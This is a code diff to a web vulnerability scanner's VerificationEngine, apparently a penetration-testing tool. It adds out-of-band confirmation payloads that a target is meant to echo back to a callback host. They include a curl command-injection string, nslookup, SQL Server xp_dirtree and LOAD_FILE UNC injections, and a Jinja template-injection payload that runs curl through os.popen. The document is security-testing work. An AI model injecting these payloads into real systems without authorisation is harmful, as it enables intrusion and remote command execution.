@@ -40,8 +40,8 @@ class VerificationEngine:
         self._session = make_session(config)
 
         if container:
-            self.oob = container.oob_framework
-            self.browser = container.browser_validator
+            self.oob = getattr(container, "oob_framework", None)
+            self.browser = getattr(container, "browser_validator", None)
             self.oob_available = bool(self.oob and self.oob.oob_host)
         else:
             self.oob = None
@@ -101,6 +101,25 @@ class VerificationEngine:
                 existing = [str(existing)] if existing else []
             existing.extend(evidence_parts)
             f["evidence"] = existing
+        # Add confidence reasons for the promotion
+        reasons = f.get("confidence_reasons")
+        if not isinstance(reasons, list):
+            reasons = []
+        if stage == "validated":
+            reasons.append("+ Secondary validation confirmed (VerificationEngine)")
+            if not any("Detection signal" in r for r in reasons):
+                reasons.insert(0, "+ Detection signal present")
+        elif stage == "exploitable":
+            if not any("Exploitation proof" in r for r in reasons):
+                reasons.append("+ Exploitation proof demonstrated (VerificationEngine)")
+            if not any("Secondary validation" in r for r in reasons):
+                reasons.append("+ Secondary validation confirmed (VerificationEngine)")
+        elif stage == "verified":
+            if not any("Independently verified" in r for r in reasons):
+                reasons.append("+ Independently verified (VerificationEngine)")
+            if not any("Exploitation proof" in r for r in reasons):
+                reasons.append("+ Exploitation proof demonstrated (VerificationEngine)")
+        f["confidence_reasons"] = reasons
         log(f"  [Verify] {f.get('vuln_type', '')} @ {f.get('url', '')} promoted to {stage.upper()} (score={f['confidence_score']})",
             Colors.GREEN)
 
@@ -254,14 +273,51 @@ class VerificationEngine:
         param = f.get("parameter", "")
         if not param or not url:
             return
-        oob_payload = self.oob.generate_payload()
-        test_url = self._inject_param(url, param, oob_payload)
-        safe_get(self._session, test_url, 10, raise_for_status=False)
-        self.oob.register_interaction(vuln_type, oob_payload, url)
+
+        oob_host = self.oob.callback_host
+        if not oob_host:
+            return
+
+        # Build vulnerability-specific OOB payloads
+        if vuln_type == "ssrf":
+            oob_payloads = [f"http://{oob_host}/verify-ssrf"]
+        elif vuln_type == "cmdi":
+            oob_payloads = [
+                f"; curl http://{oob_host}/verify-cmdi",
+                f"| nslookup {oob_host}",
+            ]
+        elif vuln_type == "sqli":
+            oob_payloads = [
+                f"'; exec master..xp_dirtree '//{oob_host}/sqli'--",
+                f"' UNION SELECT LOAD_FILE('\\\\\\\\{oob_host}\\\\sqli')--",
+            ]
+        elif vuln_type == "ssti":
+            oob_payload = self.oob.generate_payload(
+                "{{config.__class__.__init__.__globals__['os'].popen('curl http://{oob}/ssti').read()}}"
+            )
+            if not oob_payload:
+                return
+            test_url = self._inject_param(url, param, oob_payload)
+            safe_get(self._session, test_url, 10, raise_for_status=False)
+            self.oob.register_interaction(vuln_type, oob_payload, url)
+            confirmed = self.oob.poll()
+            if confirmed:
+                self._promote(f, "verified", ["oob:callback"])
+            return
+        elif vuln_type == "xxe":
+            # XXE via query param is unusual; skip OOB verification
+            return
+        else:
+            return
+
+        for payload in oob_payloads:
+            test_url = self._inject_param(url, param, payload)
+            safe_get(self._session, test_url, 10, raise_for_status=False)
+            self.oob.register_interaction(vuln_type, payload, url)
 
         confirmed = self.oob.poll()
         if confirmed:
-            self._promote(f, "verified", [f"oob:callback"])
+            self._promote(f, "verified", ["oob:callback"])
 
     @staticmethod
     def _inject_param(url: str, param: str, value: str) -> str:
